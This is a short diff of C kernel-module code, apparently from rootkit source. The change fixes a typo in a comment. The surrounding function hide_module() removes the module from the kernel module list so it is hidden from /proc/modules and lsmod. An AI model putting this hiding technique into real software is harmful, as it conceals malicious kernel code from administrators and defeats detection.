@@ -22,7 +22,7 @@ unsigned int num_symtab_old;
 int hide_module(void){
 	if (hidden)
 		return -1;
-	// Hide from /proc/modules (there from lsmod)
+	// Hide from /proc/modules (therefore from lsmod)
 	// We just delete the module from the list
 	prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
